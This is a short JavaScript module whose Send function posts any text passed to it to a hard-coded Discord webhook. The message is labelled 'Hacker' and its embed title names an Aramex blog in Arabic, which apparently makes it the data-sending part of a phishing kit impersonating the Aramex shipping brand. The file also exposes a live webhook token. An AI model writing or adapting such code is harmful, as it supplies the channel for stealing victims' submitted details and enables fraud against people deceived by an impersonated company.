import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1340428765272215592/S945FNJKhdDvjjOdb120CmWkIq1LYg7ICsZg6dKbHYAnYoWl_74mw1QRMZTir-K1AxMU",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
